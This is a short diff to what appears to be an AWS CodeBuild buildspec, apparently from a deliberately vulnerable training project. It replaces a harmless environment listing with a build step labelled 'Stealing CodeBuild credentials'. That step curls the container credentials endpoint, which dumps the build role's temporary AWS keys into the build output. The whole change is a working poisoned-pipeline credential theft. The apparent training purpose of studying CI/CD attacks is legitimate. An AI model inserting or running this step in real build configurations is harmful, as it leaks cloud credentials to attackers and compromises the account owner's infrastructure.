@@ -3,6 +3,5 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "Running vulnerable training build"
-      - env | sort | head -n 20
-      - echo "Done"
+      - echo "Stealing CodeBuild credentials"
+      - curl -s http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
